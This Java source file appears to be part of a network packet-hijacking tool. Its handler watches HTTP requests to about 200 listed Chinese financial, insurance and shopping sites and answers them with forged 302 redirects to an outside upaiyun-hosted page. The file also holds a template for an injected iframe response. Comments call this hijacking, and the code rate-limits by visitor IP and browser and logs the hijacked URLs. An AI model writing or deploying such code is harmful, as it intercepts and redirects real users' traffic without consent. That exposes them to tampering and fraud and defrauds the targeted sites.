package com.asme.collector.packet.handler;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

import org.apache.commons.io.FileUtils;
import org.apache.http.message.BasicHeader;
import org.apache.log4j.Logger;

import com.asme.collector.packet.HttpGetPacket;
import com.asme.collector.util.MD5Util;
import com.asme.collector.util.SystemTime;
import com.asme.collector.util.Timer;
import com.asme.collector.util.TimerTask;

/**
 */
public class CountHandler implements HttpGetPacketHandler {
	private static final Logger log = Logger.getLogger(CountHandler.class);
	// 302 响应的固定部分
	private static final String[] RESP302 = { "HTTP/1.1 302 Found\r\nCache-Control: no-cache\r\nLocation: ",
			// 这里拼上跳转地址
			"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" };
	// 200 注入JS响应头的固定部分以及它们的长度
		public static final String[] RESP200_INJECT_JS = {
				"HTTP/1.1 200 OK\r\nContent-Length: ",
				// 这里拼上内容长度
				"\r\nCache-Control: no-cache\r\nConnection: close\r\n\r\n",
				"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"><html style=\"overflow-y:hidden;\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"/></head><body style=\"margin:0px;padding:0px;\"><script type=\"text/javascript\">if(top.location==self.location){document.write([",
				"'<iframe id=\"_c\", marginwidth=\"0\" marginheight=\"0\" width=\"100%\" height=\"',document.documentElement.clientHeight-5,'\" frameborder=\"0\" src=\"",
				// 这里是当前访问的页面
				"\" scrolling=\"auto\"><','/iframe>'].join(''));}else{window.location.href='",
				// 这里是当前访问的页面
				"';}"};
		public static final int RESP200_INJECT_JS_LEN = RESP200_INJECT_JS[2].length() + RESP200_INJECT_JS[3].length() + RESP200_INJECT_JS[4].length() + RESP200_INJECT_JS[6].length();

	// 系统时间
	private static SystemTime systemTime;

	private static Map<String, AtomicLong> countMap = new HashMap<String, AtomicLong>();
	// 复用的StringBuilder
	private StringBuilder sb = new StringBuilder();
	// 控制劫持频率的Map
	public static ConcurrentHashMap<String, Long> freqControlMap = new ConcurrentHashMap<String, Long>(2 << 20);

	// 控制劫持频率的Map
	private static AtomicBoolean CLEAR_STARTED = new AtomicBoolean(false);
	public static ArrayBlockingQueue<String[]> HOSTQ = new ArrayBlockingQueue<String[]>(5000);

	public static AtomicInteger TUJIA = new AtomicInteger();

	private static Set<String> hostSet = new HashSet<String>();
	static {
		hostSet.add("www.minanins.com");
		hostSet.add("www.axatp.com");
		hostSet.add("www.zurich.com.cn");
		hostSet.add("www.cpcr.com.cn");
		hostSet.add("bdtg.9377a.com");
		hostSet.add("sport.peaksport.com");
		hostSet.add("touch.dangdang.com");
		hostSet.add("book.dangdang.com");
		hostSet.add("www.estock.com.cn");
		hostSet.add("www.dtsbc.com.cn");
		hostSet.add("www.tebon.com.cn");
		hostSet.add("www.dfzq.com.cn");
		hostSet.add("www.dgzq.com.cn");
		hostSet.add("www.longone.com.cn");
		hostSet.add("www.dwjq.com.cn");
		hostSet.add("www.gzs.com.cn");
		hostSet.add("www.guodu.com");
		hostSet.add("www.gkzq.com.cn");
		hostSet.add("www.cnht.com.cn");
		hostSet.add("www.hongtastock.com");
		hostSet.add("www.cfsc.com.cn");
		hostSet.add("www.jhzq.com.cn");
		hostSet.add("www.jyzq.com.cn");
		hostSet.add("www.kysec.cn");
		hostSet.add("www.lxzq.com.cn");
		hostSet.add("www.mszq.com");
		hostSet.add("www.rxzq.com.cn");
		hostSet.add("www.i618.com.cn");
		hostSet.add("www.962518.com");
		hostSet.add("www.tpyzq.com");
		hostSet.add("www.chstock.com");
		hostSet.add("www.cczq.com");
		hostSet.add("www.e-chinalife.com");
		hostSet.add("baoxian.pingan.com");
		hostSet.add("www.newchinalife.com");
		hostSet.add("www.cpic.com.cn");
		hostSet.add("www.taikang.com");
		hostSet.add("www.aia.com.cn");
		hostSet.add("www.picclife.com");
		hostSet.add("www.greatlife.cn");
		hostSet.add("www.aviva-cofco.com.cn");
		hostSet.add("www.citic-prudential.com.cn");
		hostSet.add("www.minshenglife.com");
		hostSet.add("www.metlife.com.cn");
		hostSet.add("www.sino-life.com");
		hostSet.add("life.cntaiping.com");
		hostSet.add("www.sunlife-everbright.com");
		hostSet.add("www.hengansl.com");
		hostSet.add("www.samsung-airchinalife.com");
		hostSet.add("www.aegonthtf.com");
		hostSet.add("www.unionlife.com.cn");
		hostSet.add("life.sinosig.com");
		hostSet.add("shop.sino-life.com");
		hostSet.add("www.picchealth.com");
		hostSet.add("www.epicc.com.cn");
		hostSet.add("e.cic.cn");
		hostSet.add("www.ab95569.com");
		hostSet.add("www.sinosig.com");
		hostSet.add("www.dbic.com.cn");
		hostSet.add("www.sinosafe.com.cn");
		hostSet.add("www.95505.com.cn");
		hostSet.add("www.ccic-net.com.cn");
		hostSet.add("www.yaic.com.cn");
		hostSet.add("www.bpic.com.cn");
		hostSet.add("www.jiayuan.com");
		hostSet.add("www.bangyoudai.com");
		hostSet.add("international.tujia.com");
		hostSet.add("www.daling.com");
		hostSet.add("www.ppdai.com");
		hostSet.add("www.hitao.com");
		hostSet.add("www.egou.com");
		hostSet.add("www.juanpi.com");
		hostSet.add("www.fanli.com");
		hostSet.add("channel.yhd.com");
		hostSet.add("www.hecha.cn");
		hostSet.add("www.wine9.com");
		hostSet.add("www.winekee.com");
		hostSet.add("www.zuipin.cn");
		hostSet.add("www.maimaicha.com");
		hostSet.add("www.maichawang.com");
		hostSet.add("www.jiumei.com");
		hostSet.add("www.chinastock.com.cn");
		hostSet.add("special.jiuxian.com");
		hostSet.add("list.jiuxian.com");
		hostSet.add("www.youzu.com");
		hostSet.add("www.chihw.roboo.com");
		hostSet.add("www.fruitday.com");
		hostSet.add("www.huipinzhe.com");
		hostSet.add("www.taoniupin.com");
		hostSet.add("www.taowola.com");
		hostSet.add("www.etongdai.com");
		hostSet.add("www.91wangcai.com");
		hostSet.add("www.zlot.cn");
		hostSet.add("www.nonobank.com");
		hostSet.add("www.onlinecredit.cn");
		hostSet.add("www.aicaike.com");
		hostSet.add("www.changjiudai.com");
		hostSet.add("www.jjry.com");
		hostSet.add("www.168licai.cn");
		hostSet.add("www.rongcuhui.com");
		hostSet.add("www.hydbest.com");
		hostSet.add("www.jinfax.com");
		hostSet.add("www.okleyi.com");
		hostSet.add("www.88daiw.com");
		hostSet.add("www.kingkaid.com");
		hostSet.add("www.xadai.com");
		hostSet.add("www.plateno.com");
		hostSet.add("www.chinaskin.cn");
		hostSet.add("www.yirendai.com");
		hostSet.add("www.wenshangdai.com");
		hostSet.add("www.hexindai.com");
		hostSet.add("www.dezhong365.com");
		hostSet.add("www.88.com.cn");
		hostSet.add("www.frbao.com");
		hostSet.add("www.hyrdw.com");
		hostSet.add("www.ronghedai.com");
		hostSet.add("www.yrhx.com");
		hostSet.add("www.wangdaizhijia.com");
		hostSet.add("www.mindai.com");
		hostSet.add("www.sjqkd.com");
		hostSet.add("www.fenqian.cn");
		hostSet.add("www.okydt.com");
		hostSet.add("www.xiaoniu88.com");
		hostSet.add("www.tintinloan.com");
		hostSet.add("www.koudailc.com");
		hostSet.add("www.yonglibao.com");
		hostSet.add("www.yueyuedai.com");
		hostSet.add("www.honhe.com");
		hostSet.add("www.mzmoney.com");
		hostSet.add("www.ehjinrong.com");
		hostSet.add("www.tuandai.com");
		hostSet.add("www.rrjc.com");
		hostSet.add("www.yiqihao.com");
		hostSet.add("www.365edai.cn");
		hostSet.add("www.yooli.com");
		hostSet.add("www.my089.com");
		hostSet.add("www.niwodai.com");
		hostSet.add("www.bxcf365.com");
		hostSet.add("www.eloancn.com");
		hostSet.add("www.rylc9.com");
		hostSet.add("www.wowodai.cn");
		hostSet.add("www.sidatz.com");
		hostSet.add("www.okdai.com");
		hostSet.add("www.yidai.com");
		hostSet.add("www.jinnuoding.com");
		hostSet.add("www.irongbei.com");
		hostSet.add("www.xinxindai.com");
		hostSet.add("www.solarbao.com");
		hostSet.add("www.jfz.com");
		hostSet.add("www.id68.cn");
		hostSet.add("www.baobidai.com");
		hostSet.add("www.huirendai.com");
		hostSet.add("www.wacai.com");
		hostSet.add("www.rmbbox.com");
		hostSet.add("www.88bank.com");
		hostSet.add("as-exchange.com");
		hostSet.add("www.dianrong.com");
		hostSet.add("www.meishichina.com");
		hostSet.add("product.suning.com");
		hostSet.add("www.yesmywine.com");
		hostSet.add("zhongjiu.cn");
		hostSet.add("www.gjw.com");
		hostSet.add("www.foods1.com");
		hostSet.add("www.lingshi.com");
		hostSet.add("item.tmall.com");
		hostSet.add("www.clhoo.com");
		hostSet.add("www.newone.com.cn");
		hostSet.add("www.foundersc.com");
		hostSet.add("www.hysec.com");
		hostSet.add("www.swsc.com.cn");
		hostSet.add("www.njzq.com.cn");
		hostSet.add("www.95579.com");
		hostSet.add("www.xcsc.com");
		hostSet.add("www.ccnew.com");
		hostSet.add("www.firstcapital.com.cn");
		hostSet.add("www.bigsun.com.cn");
		hostSet.add("www.gtja.com");
		hostSet.add("www.qlzq.com.cn");
		hostSet.add("www.gsstock.com");
		hostSet.add("www.ebscn.com");
		hostSet.add("www.guosen.com.cn");
		hostSet.add("www.gf.com.cn");
		hostSet.add("www.nesc.cn");
		hostSet.add("www.gyzq.com.cn");
		hostSet.add("www.gjzq.com.cn");
		hostSet.add("www.xyzq.com.cn");
		hostSet.add("www.htsec.com");
		hostSet.add("www.htsc.com.cn");
		hostSet.add("www.hx168.com.cn");
		hostSet.add("www.dxzq.net");
		hostSet.add("www.scstock.com");
		hostSet.add("www.cicc.com");
		hostSet.add("www.csc108.com");
		hostSet.add("www.swsresearch.com");
		hostSet.add("www.ghsl.cn");
		hostSet.add("www.ewww.com.cn");
		hostSet.add("www.ubs.com");
		hostSet.add("www.s10000.com");
		hostSet.add("www.cfzq.com");
		hostSet.add("www.ctsec.com");
	}

	public CountHandler(Timer timer) {
		if (CLEAR_STARTED.compareAndSet(false, true)) {

			// 保证只有一个线程启动这个定时任务
			timer.timing(new TimerTask() {

				@Override
				public void run() {
					long now = systemTime.getTime();
					for (Iterator<Entry<String, Long>> it = freqControlMap.entrySet().iterator(); it.hasNext();) {
						if (now - it.next().getValue() > 0)
							it.remove();
					}
				}

				public Type type() {
					return Type.INTERVAL;
				}

				public long delayOrIntervalMillis() {
					return 3000;
				}

				public boolean isTriggerIndependently() {
					return false;
				}
			});
		}
	}

	public static void init() {
		final File dir = new File("result/count");
		if (!dir.exists()) {
			try {
				FileUtils.forceMkdir(dir);
				log.info("创建文件夹[result/count]成功");
			} catch (IOException e) {
				log.error("创建文件夹[result/count]失败");
			}
		}
		File countFile = new File(dir, "count.txt");
		BufferedReader br = null;
		try {
			br = new BufferedReader(new InputStreamReader(new FileInputStream(countFile), "utf-8"));
			String line;
			while ((line = br.readLine()) != null) {
				String[] fields = line.split("\t");
				String host = fields[0];
				Long count = Long.parseLong(fields[1]);
				AtomicLong al = new AtomicLong(count);
				countMap.put(host, al);
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} finally {
			if (br != null) {
				try {
					br.close();
				} catch (IOException e) {
				}
			}
		}
		final List<BasicHeader> collection = new ArrayList<BasicHeader>();
		collection.add(new BasicHeader("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"));
		collection.add(new BasicHeader("Accept", "image/png,image/*;q=0.8,*/*;q=0.5"));
		collection.add(new BasicHeader("Accept-Encoding", "gzip, deflate"));
		collection.add(new BasicHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"));
		collection.add(new BasicHeader("Connection", "keep-alive"));
		collection.add(new BasicHeader("Host", "Host"));
		Thread t = new Thread("dodCountWriter") {

			public void run() {
				log.info("开始处理统计请求");
				int minute = systemTime.getMinute();
				for (; !Thread.interrupted();) {
					String[] u = null;
					try {
						u = HOSTQ.poll(100, TimeUnit.MILLISECONDS);
					} catch (Exception e) {
						break;
					}
					if (u == null) {
						continue;
					}
					AtomicLong al = countMap.get(u[0]);
					if (al == null) {
						al = new AtomicLong(0);
						countMap.put(u[0], al);
					}
					al.incrementAndGet();
					// log.info("域名[" + u[0] + "]统计了[" + count + "]个");
					int m = systemTime.getMinute();
					if (m != minute) {
						minute = m;
						File countFile = new File(dir, "count.txt");
						BufferedWriter bw = null;
						try {
							bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(countFile), "utf-8"));
							for (Entry<String, AtomicLong> entry : countMap.entrySet()) {
								String host = entry.getKey();
								al = entry.getValue();
								String line = host + "\t" + al.get() + "\r\n";
								bw.write(line);
							}
						} catch (Exception e) {
						} finally {
							if (bw != null) {
								try {
									bw.close();
								} catch (IOException e) {
								}
							}
						}
					}

				}
			}
		};
		t.setDaemon(true);
		t.start();
	}

	/**
	 * (non-Javadoc)
	 * 
	 * @see com.asme.hijack.HttpPacketHandler#handle(com.asme.hijack.HttpReqPacket)
	 */
	@Override
	public byte[] handle(HttpGetPacket packet) {

		if (packet.headers != null && packet.uri != null && packet.url != null) {
			String srcip = packet.srcip;
			if (srcip == null)
				return null;
			// String dstip = packet.destip;
			// String url = packet.url;
			String host = packet.headers.get("host");
			if (host == null)
				return null;
			String ua = packet.headers.get("user-agent");
			if (ua == null)
				return null;
			// String ad = Md5Util.Md5(ua + srcip);
			String referer = packet.headers.get("referer");
			if (referer == null)
				referer = "--";
			String url = packet.url;
			// String cookies = packet.headers.get("cookie");
			if (hostSet.contains(host) || host.endsWith("yhd.com") || host.endsWith("dangdang.com")) {
				sb.append(RESP302[0]).append("http://js001.b0.upaiyun.com/gc3.html?t=").append(url).append(RESP302[1]);
				byte[] b = sb.toString().getBytes();
				sb.delete(0, sb.length());

				String key = MD5Util.MD5(srcip + ua + host);
				// 新key并且劫持响应不超长,则劫持这个请求
				if (freqControlMap.putIfAbsent(key, systemTime.getTime() + 240000) == null) {
					log.info("处理了一个[" + host + "]请求ip[" + packet.srcip + "]url[" + url + "]");
					HOSTQ.offer(new String[] { host, url });
					return b;
				}
			}
		}
		return null;
	}

	/**
	 * @param systemTime
	 *            the systemTime to set
	 */
	public static void setSystemTime(SystemTime systemTime) {
		CountHandler.systemTime = systemTime;
	}
}
